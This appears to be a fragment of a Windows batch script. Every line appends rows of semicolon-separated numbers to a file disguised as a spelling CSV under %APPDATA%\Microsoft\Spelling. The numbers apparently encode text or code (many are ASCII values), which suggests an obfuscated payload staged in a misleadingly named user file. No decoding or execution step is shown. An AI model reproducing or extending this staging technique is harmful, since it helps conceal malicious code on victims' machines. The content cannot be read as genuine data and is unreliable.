>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(143.9262;852.82;895.245;925.95;2319.860;127.532;100.831;110.4297;929.101;637.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(858.103;2622.828;244.749;105.829;244.6152;349.105;831.244;749.105;7126.448;98.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.858;60.7192;877.105;553.211;922.111;3857.492;176.913;114.855;36.1143;345.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(896.174;571.115;9485.814;38.841;119.857;91.8649;923.120;419.23;836.124;8102.411;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(234.803;127.834;32.6691;864.127;530.0;50.0;0093.776;11.50;0.842;6.9359;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.0;663.0;30.0;3798.857;4.40;0.949;4.0601;50.0;839.2;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3452.566;3.70;0.885;11.2818;70.0;47.8;30.0;4006.890;8.30;0.925;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.8756;40.0;64.9;60.0;8569.539;9.50;0.374;9.8780;70.0;809.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;9700.844;9.50;0.879;9.1643;50.0;779.8;60.0;3621.342;8.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.853;8.9871;70.0;816.8;30.0;7066.439;1.40;0.499;7.0740;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(654.7;40.0;4498.864;0.60;0.874;5.1969;70.0;844.1;70.0;6100.319;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.70;0.389;13.0164;30.0;354.13;60.0;9569.382;6.40;0.869;3.3303;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;824.13;70.0;3969.814;5.40;0.898;3.0753;70.0;953.9;50.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8869.738;10.30;0.698;0.6835;60.0;488.1;30.0;2686.892;2.70;0.323;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.1440;40.0;889.0;30.0;8906.781;5.30;0.683;12.6893;60.0;544.12;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;6156.843;5.40;0.811;11.0912;40.0;848.11;30.0;6418.926;11.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.47;12.8416;50.0;924.12;50.0;2616.873;12.60;0.822;12.2458;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(913.6;60.0;2780.879;13.30;0.721;0.1237;60.0;45.4;60.0;3817.714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7.40;0.882;4.8036;30.0;844.7;60.0;6912.413;1.70;0.902;13.3792;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;724.1;40.0;2896.912;0.70;0.946;10.7652;60.0;909.10;60.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4642.817;6.60;0.914;9.6951;70.0;439.4;70.0;1149.913;5.60;0.841;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5686;40.0;830.4;60.0;3012.782;2.50;0.928;4.5705;70.0;697.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.0;9691.518;3.60;0.805;4.1310;30.0;909.4;50.0;3220.727;11.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.824;3.6723;40.0;639.6;60.0;5054.882;6.60;0.466;4.9783;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(867.1;60.0;0532.614;4.30;0.954;5.3919;70.0;843.10;60.0;2452.876;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(10.40;0.810;10.1867;50.0;930.7;70.0;1922.823;1.60;0.945;2.4890;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;928.1;40.0;0874.60;0.60;0.750;5.2455;50.0;779.10;70.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2041.737;3.30;0.869;6.0737;60.0;623.2;30.0;3478.895;7.30;0.877;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(17.5648;50.0;716.65;50.115;2726.60;115.50;101.70;109.2980;60.98;50.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.121;0686.30;0.50;0.40;4.9259;567.0;383.0;710.0;4770.40;0.428;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.70;104.3488;30.101;30.99;60.107;9223.30;84.70;121.40;112.9643;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.115;70.76;2005.70;111.60;110.60;103.1121;70.14;40.0;50.30;4505.467;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.804;0.801;0.7461;699.0;807.0;684.0;5554.821;0.812;0.801;0.7941;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;383.0;804.0;1281.811;0.814;0.816;0.5079;726.0;70.0;638.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8495.70;111.40;109.60;112.3533;60.105;40.108;60.97;5120.70;116.70;105.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.3796;70.110;70.70;70.105;5721.40;110.70;105.30;115.9956;40.104;30.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.100;5909.60;30.40;0.50;18.9696;768.0;801.0;598.0;7167.817;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.576;0.0669;811.0;810.0;803.0;0353.787;0.60;0.520;68.7841;60.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.98;60.117;6131.70;103.50;83.40;104.4339;60.111;70.114;70.116;0836.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(94.60;0.50;18.6498;568.0;801.0;808.0;5719.797;0.821;0.583;0.1160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;803.0;810.0;9065.697;0.70;0.352;68.8480;30.101;70.108;60.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1291.50;109.30;105.30;116.1027;50.101;30.114;60.77;3056.60;97.30;121.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(78.1027;60.111;50.116;70.83;2002.30;116.60;97.60;114.8496;30.116;60.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.119;4320.60;105.70;116.70;99.8280;40.104;70.108;40.0;7016.30;6.669;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.820;0.5859;801.0;881.0;40.0;9248.510;70.40;97.40;108.5220;40.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.101;40.186;8715.50;0.30;44.371;0.9770;801.0;810.0;801.0;0113.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.597;0.808;0.5954;595.0;677.0;805.0;9614.815;0.815;0.805;0.6455;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;803.0;483.0;1900.801;0.814;0.818;0.6063;805.0;599.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5579.889;0.30;0.330;71.6457;30.101;70.110;40.101;4768.40;114.30;97.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.8915;40.101;60.100;60.69;2375.60;114.50;114.70;111.7300;50.114;70.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.41;1756.71;0.50;16.672;0.0395;801.0;808.0;812.0;9176.576;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.0646;803.0;492.1;40.0;7485.418;72.30;101.40;108.8320;30.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.83;50.104;8679.70;111.70;114.50;116.6751;40.98;31.0;30.56;4063.673;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.818;0.9318;797.0;808.0;805.0;1627.800;0.467;0.804;0.3143;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;699.0;807.0;7143.784;0.821;0.812;0.0672;801.0;815.0;583.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6502.819;0.805;0.816;0.6506;499.0;804.0;686.0;0970.397;0.808;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1361;801.0;801.1;60.0;5600.546;73.30;110.70;118.3145;50.97;60.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.105;7199.60;100.30;68.60;101.9475;60.98;70.117;60.103;8372.40;83.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.60;105.6684;30.116;50.99;70.104;8417.40;86.50;97.60;108.9084;60.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.101;30.166;0989.71;0.30;54.473;0.0676;810.0;818.0;797.0;1585.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.805;0.800;0.5088;568.0;801.0;808.0;6045.797;0.821;0.383;0.4659;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;803.0;810.0;9389.683;0.819;0.805;0.9458;816.0;699.0;804.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7048.686;0.497;0.808;0.0572;817.0;801.0;931.1;3261.50;0.552;73.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.9363;30.118;30.97;60.108;5366.30;105.60;100.30;76.5768;70.97;40.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.103;3916.30;117.70;97.60;103.9007;50.101;70.83;40.119;6269.30;105.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;99.4104;40.104;30.86;60.97;7519.40;108.40;117.70;101.7007;70.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(42.0;30.48;6032.773;0.810;0.818;0.3556;797.0;808.0;805.0;3896.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.578;0.811;0.8776;767.0;811.0;800.0;1802.801;0.483;0.819;0.7069;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;816.0;699.0;2852.804;0.686;0.497;0.7164;808.0;817.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5539.812;2.40;0.348;73.6412;70.110;40.118;40.97;7611.30;108.50;105.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.7371;50.84;50.97;40.114;2298.40;103.40;101.70;116.6810;30.83;30.119;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.105;1657.30;116.40;99.50;104.9653;50.86;40.97;30.108;2964.40;117.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.50;173.5670;72.0;70.24;375.0;4999.801;0.821;0.467;0.4781;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;816.0;6935.497;0.805;0.810;0.1650;801.0;814.0;948.2;0833.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.514;75.60;101.8653;50.121;60.70;60.105;8900.30;108.50;101.30;6.0527;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.0;50.24;376.0;3284.397;0.810;0.803;0.5669;817.0;397.0;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8661.801;0.476;0.811;0.0992;810.0;803.0;615.3;7103.60;0.326;76.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.6440;50.110;30.103;70.117;1452.40;97.30;103.30;101.2737;60.83;30.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;6743.50;114.40;116.40;25.5563;53.0;50.22;476.0;3777.805;0.398;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.7803;497.0;814.0;821.0;7836.576;0.811;0.810;0.2541;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(428.3;70.0;1571.540;76.30;105.70;98.9997;70.114;30.97;70.114;4297.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(121.30;80.70;97.4876;50.116;60.104;30.73;5248.70;115.40;73.60;110.9412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.118;70.97;40.108;7236.50;105.60;100.30;37.2626;33.0;50.24;576.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9585.805;0.698;0.814;0.5353;497.0;814.0;821.0;9426.583;0.804;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6904;814.0;816.0;673.3;1342.30;0.558;77.30;105.0495;50.115;50.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.105;6300.30;110.40;103.60;70.9911;60.105;70.108;60.101;5952.60;83.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.30;101.0951;50.99;50.105;30.102;9358.50;105.70;99.30;97.5950;30.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.105;50.111;9906.70;110.50;69.50;114.9227;50.114;60.111;40.114;0608.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(78.33;0.40;4.7146;578.0;811.0;831.3;6366.30;0.520;78.30;111.4106;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.67;60.111;70.100;3330.40;101.30;76.30;111.5994;50.110;40.103;60.134;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1809.43;0.60;22.678;0.2334;811.0;367.0;811.0;6120.800;0.801;0.783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5605;804.0;811.0;814.0;5438.816;0.842;3.70;0.3096;334.78;40.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.73;1959.60;110.50;112.30;117.7066;60.116;70.115;60.83;5675.30;112.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.30;99.2273;40.105;30.102;50.105;7569.30;101.50;100.70;146.5397;33.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.20;478.0;4598.811;0.676;0.811;0.5034;803.0;811.0;376.0;9388.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.803;0.8294;875.3;70.0;622.78;5318.70;111.70;76.40;111.3076;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.103;40.111;30.83;5655.70;104.40;111.60;114.7912;30.116;60.183;73.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0673.60;20.478;0.811;0.0124;387.0;497.0;814.0;5315.810;0.576;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4417;810.0;803.0;886.3;6570.50;0.722;78.70;111.6826;30.87;50.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.114;5494.30;110.50;83.60;104.3050;30.111;70.114;50.116;8154.30;194.43;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;14.5317;679.0;817.0;816.0;9531.476;0.811;0.810;0.8843;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(897.3;40.0;8310.616;79.50;117.40;116.2082;70.83;70.104;30.111;3073.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.30;116.70;202.6935;33.0;70.52;382.0;3218.801;0.802;0.801;0.7575;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;801.0;810.0;0731.799;0.801;0.665;0.0287;815.0;815.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8225.809;0.798;0.808;0.3004;821.0;573.0;815.0;6710.373;0.810;0.818;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9410;797.0;808.0;805.0;1850.800;0.905;3.30;0.1531;326.82;60.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.102;6312.60;101.70;114.60;101.3311;40.110;40.99;60.101;4193.60;76.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.50;110.0047;50.103;40.7;64.0;3095.30;28.682;0.801;0.3064;802.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;814.0;5871.801;0.810;0.499;0.4875;801.0;583.0;804.0;0917.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.816;0.8546;518.4;40.0;724.82;2599.70;101.40;115.40;111.8591;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.117;50.114;30.99;3066.60;101.70;76.70;111.3413;30.110;60.103;70.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1289.74;0.40;26.782;0.0535;801.0;815.0;811.0;2162.817;0.814;0.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5206;801.0;683.0;804.0;6717.811;0.814;0.816;0.7623;531.4;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(634.82;6326.40;111.30;111.40;116.4155;30.78;50.97;30.109;1803.40;101.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.50;112.5138;30.97;70.99;70.101;0341.30;76.60;111.40;110.7563;30.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.36;64.0;8374.50;36.382;0.811;0.2482;811.0;816.0;478.0;1667.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.809;0.801;0.2962;815.0;812.0;597.0;2813.499;0.801;0.483;0.1774;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.0;811.0;814.0;1277.816;0.551;4.70;0.0564;636.83;60.108;40.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4314.60;115.40;104.70;82.7043;30.111;50.111;50.116;6739.60;78.30;97.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.7544;30.101;60.115;30.112;7724.50;97.40;99.60;101.7672;60.56;44.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.38;1123.383;0.811;0.817;0.8666;814.0;499.0;801.0;3721.670;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.7431;801.0;373.0;815.0;4428.473;0.810;0.818;0.3185;697.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;805.0;3791.800;0.674;4.40;0.1370;430.83;30.119;30.105;5039.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;99.70;104.0799;40.73;30.115;50.77;7675.30;105.30;115.40;115.2701;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.105;40.110;30.103;7403.40;124.44;0.60;20.4780;584.0;697.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5025.803;0.801;0.816;0.0390;776.0;811.0;810.0;0193.803;0.879;4.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9202;322.84;40.97;30.114;0835.70;103.30;101.70;116.0598;70.83;40.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.111;5046.40;114.30;116.50;187.4569;34.0;30.8;684.0;7263.814;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.0970;890.4;40.0;726.85;7519.60;110.50;107.70;110.2868;50.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.119;70.110;9711.30;83.70;119.50;105.7210;70.116;30.99;40.104;2236.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(193.44;0.70;52.0619;585.0;810.0;814.0;1190.801;0.699;0.811;0.2758;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.0;810.0;805.0;9033.822;0.801;0.800;0.0564;783.0;811.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2414.814;0.499;0.801;0.6254;670.0;805.0;808.0;1172.801;0.684;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9963;812.0;801.0;942.4;0730.30;0.34;86.50;66.3668;70.42;75.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.26;9115.687;0.670;0.367;0.1552;395.0;367.0;811.0;5240.812;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.2227;805.0;803.0;804.0;0305.816;0.346;5.70;0.6027;540.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.70;50.67;6001.70;95.30;72.70;101.6290;60.108;40.112;70.95;3419.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.30;104.40;101.0350;60.99;40.107;30.84;7906.30;121.30;112.70;101.1358;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.115;60.49;50.105;4805.75;0.40;40.587;0.3158;470.0;767.0;395.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7915.772;0.801;0.808;0.4564;812.0;695.0;367.0;3066.804;0.801;0.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3451;807.0;684.0;821.0;5151.812;0.801;0.815;0.1817;750.0;884.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;1263.546;87.60;70.50;67.6924;30.95;70.72;30.101;1445.70;108.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.30;95.2635;40.67;60.111;50.100;7990.70;101.70;71.50;101.5864;40.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.101;70.114;2493.60;97.40;116.70;105.9169;30.111;50.110;60.255;4517.75;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.60;30.787;0.5486;470.0;467.0;595.0;9474.472;0.801;0.808;0.2688;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;795.0;468.0;0854.801;0.798;0.817;0.9998;803.0;549.0;444.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8717.40;0.328;87.50;70.4462;30.67;70.95;40.72;9599.30;101.40;108.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.6056;70.95;50.73;60.110;3528.70;112.60;117.30;116.4541;30.126;56.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.30;6472.587;0.470;0.767;0.0183;495.0;672.0;801.0;8874.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.695;0.4921;773.0;810.0;812.0;5041.817;0.816;0.449;0.7077;867.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.0;632.87;3623.40;70.50;67.60;95.8256;60.72;50.101;50.108;3278.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.70;95.70;73.5435;30.110;50.112;50.117;4342.60;116.40;49.40;48.5319;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.222;36.0;40.32;1839.587;0.570;0.367;0.1768;395.0;672.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3441.808;0.812;0.495;0.9081;773.0;810.0;812.0;0299.817;0.816;0.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2831;549.0;737.7;50.0;3303.632;87.70;70.40;67.0009;50.95;40.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;4551.30;108.60;112.30;95.0828;30.73;30.110;40.112;9311.30;117.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.30;49.9774;50.50;70.112;47.0;9026.70;32.487;0.470;0.3337;567.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(795.0;572.0;4641.801;0.808;0.812;0.2013;495.0;673.0;810.0;7321.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.816;0.7943;749.0;351.0;883.7;5163.70;0.330;87.50;70.4407;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.67;60.95;40.72;2099.30;101.50;108.60;112.9131;50.95;50.73;60.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6392.60;112.30;117.30;116.3057;50.50;30.222;67.0;5240.60;30.687;0.770;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9730;567.0;495.0;672.0;8988.801;0.808;0.812;0.8387;395.0;573.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;7812.812;0.817;0.816;0.2715;651.0;621.8;60.0;2163.530;87.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.30;67.6862;60.95;50.72;50.101;2313.30;108.40;112.60;95.8392;40.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.110;40.112;0905.40;117.40;116.30;52.9160;70.106;68.0;50.30;3048.387;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.570;0.767;0.4739;495.0;772.0;801.0;5933.808;0.812;0.695;0.6841;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(673.0;810.0;812.0;0606.817;0.816;0.353;0.1610;856.8;50.0;530.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7506.50;70.70;67.30;95.1492;50.72;30.101;50.108;2591.40;112.60;95.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.0107;40.110;70.112;60.117;7170.40;116.40;54.60;240.7610;58.0;40.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(387.0;1684.570;0.667;0.495;0.3005;372.0;801.0;808.0;9781.812;0.695;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.373;0.8769;810.0;812.0;817.0;1847.816;0.655;0.436;9.4802;40.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(330.87;70.70;0199.40;67.40;95.50;72.0974;30.101;60.108;70.112;7169.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.70;73.60;110.6529;40.112;30.117;60.116;2469.50;56.60;118.79;0.6508;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.30;687.0;570.0;3592.767;0.395;0.772;0.8234;801.0;808.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8307.395;0.373;0.810;0.6835;812.0;817.0;816.0;1149.457;0.899;9.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9640;434.87;50.70;50.67;0541.70;95.30;72.70;101.2119;40.108;60.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.95;4344.40;76.30;97.50;110.2916;70.103;70.117;50.97;3311.30;103.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.50;16.4548;310.0;40.36;387.0;0697.570;0.667;0.495;0.5953;672.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;808.0;2840.812;0.495;0.576;0.0796;497.0;810.0;803.0;1904.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.397;0.803;0.3406;801.0;649.0;354.10;3122.30;0.536;87.40;70.6315;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.67;40.95;30.72;3017.30;101.60;108.40;112.4997;40.95;50.76;40.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4825.50;110.50;103.40;117.1340;40.97;50.103;70.101;1609.40;50.40;128.410;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4395;40.26;787.0;470.0;1392.567;0.795;0.472;0.3246;801.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;2541.795;0.377;0.805;0.6288;815.0;699.0;904.10;1618.60;0.328;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(87.30;70.9957;50.67;70.95;30.72;8661.60;101.30;108.70;112.4788;30.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.77;60.105;3243.30;115.40;99.40;49.0848;70.247;610.0;50.28;5557.687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.370;0.567;0.5565;595.0;372.0;801.0;3920.808;0.812;0.595;0.7005;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(477.0;805.0;815.0;8335.499;0.550;0.468;11.7528;50.0;628.87;30.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4369.40;67.60;95.40;72.4673;70.101;30.108;50.112;0360.50;95.50;77.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.7859;50.115;30.99;60.51;8526.50;154.411;0.30;32.4943;587.0;470.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(767.0;4625.495;0.472;0.801;0.0270;808.0;812.0;695.0;2192.678;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.667;0.4198;811.0;800.0;801.0;0762.449;0.929;11.40;0.0905;332.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.70;30.67;7826.60;95.60;72.40;101.2012;30.108;60.112;50.95;3339.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(78.70;111.70;67.3660;50.111;60.100;50.101;8457.30;50.40;30.612;0.9231;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.44;787.0;770.0;8438.767;0.495;0.572;0.7642;801.0;808.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6528.695;0.579;0.812;0.7867;816.0;805.0;811.0;2559.810;0.815;0.495;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2214;483.0;816.0;397.0;0994.814;0.816;0.801;12.4758;40.0;530.87;
